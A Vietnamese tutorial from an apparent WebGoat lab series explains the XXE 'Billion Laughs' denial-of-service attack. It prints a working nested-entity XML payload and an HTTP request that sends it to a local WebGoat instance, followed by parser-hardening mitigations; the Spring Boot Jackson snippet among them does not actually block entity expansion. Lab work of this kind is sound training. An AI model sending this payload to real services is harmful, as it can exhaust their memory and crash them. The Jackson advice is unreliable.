---
title: 1.09 | XXE
slug: XXE-09
description: Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8
image: https://tiennhm.github.io/img/docs/database.jpg
sidebar_position: 1
# sidebar_class_name: hidden
tags: 
    - web-security
    - webgoat
    - security-misconfiguration
    - xxe
    - webgoat-2023.8
keywords: [web-security, webgoat, security-misconfiguration, xxe, webgoat-2023.8]
enableComments: true # for Gisqus comments, set to true
draft: false # set to true to hide this post from the site
---

> **XXE DoS Attack – Billion Laughs Attack**  

## **1. Giới thiệu về tấn công XXE DoS**  
Trong bài trước, ta đã thấy **XXE Injection** có thể được dùng để đọc file hệ thống. Nhưng ngoài việc đọc dữ liệu, **XXE cũng có thể gây tấn công từ chối dịch vụ (DoS – Denial of Service)**.  

💡 Một trong những kỹ thuật phổ biến để tấn công DoS thông qua XXE là **Billion Laughs Attack**.  


## **2. Cách hoạt động của Billion Laughs Attack**  

Đây là payload XML thực hiện tấn công:  

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

📌 **Phân tích cách hoạt động**  
1. **Khai báo thực thể (`ENTITY`) lồng nhau**:  
   - `&lol;` = `"lol"`  
   - `&lol1;` = `10 x &lol;`  
   - `&lol2;` = `10 x &lol1;`  
   - `&lol3;` = `10 x &lol2;`  
   - …  
   - `&lol9;` = `10 x &lol8;`  

2. **Tổng dung lượng khi mở rộng thực thể**:  
   - Dữ liệu XML ban đầu chỉ vài trăm byte.  
   - Sau khi mở rộng thực thể, nó chiếm gần 3GB bộ nhớ.  
   - Server có thể bị crash vì hết bộ nhớ.  


## **3. Thử nghiệm với WebGoat**  

Gửi request chứa payload **Billion Laughs Attack**:  

```http
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

🛑 **Kết quả mong đợi**:  
- Nếu hệ thống **dễ bị tấn công**, server có thể **bị crash** do hết bộ nhớ.  
- Nếu hệ thống đã có bảo vệ, nó sẽ từ chối request với lỗi:  

```
javax.xml.stream.XMLStreamException: Maximum entity expansion limit reached
```


## **4. Biện pháp phòng chống XXE DoS**  

### **1️⃣ Tắt hỗ trợ ENTITY trong XML Parser**  
Trong Java, có thể chặn **ENTITY** để ngăn tấn công XXE:  

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
DocumentBuilder builder = factory.newDocumentBuilder();
```


### **2️⃣ Giới hạn số lần mở rộng thực thể**  
Một số thư viện cho phép đặt giới hạn số lần mở rộng thực thể để tránh lặp vô hạn.  

Trong **Python** với `lxml`:  
```python
from lxml import etree

parser = etree.XMLParser(resolve_entities=False)  # Chặn mở rộng ENTITY
xml_data = '<!DOCTYPE foo [<!ENTITY x "Hello">]><foo>&x;</foo>'
etree.fromstring(xml_data, parser)  # Không bị XXE
```

Trong **Spring Boot**, có thể cấu hình `JacksonXmlModule`:  

```java
JacksonXmlModule module = new JacksonXmlModule();
module.setDefaultUseWrapper(false);
XmlMapper xmlMapper = new XmlMapper(module);
xmlMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
```


### **3️⃣ Chỉ sử dụng JSON thay vì XML**  
Nếu ứng dụng không thực sự cần XML, tốt nhất chỉ sử dụng **JSON** để tránh các lỗ hổng liên quan đến XML.  

```json
{
    "message": "Hello, world!"
}
```


## **5. Kết luận**  
- **XXE DoS Attack (Billion Laughs Attack)** có thể làm server bị crash bằng cách mở rộng thực thể lặp vô hạn.  
- **Thử nghiệm trên WebGoat** bằng cách gửi một payload với nhiều ENTITY lồng nhau.  
- **Phòng chống** bằng cách:  
  1. Tắt ENTITY trong XML Parser.  
  2. Giới hạn số lần mở rộng thực thể.  
  3. Chuyển sang JSON thay vì XML nếu có thể.  
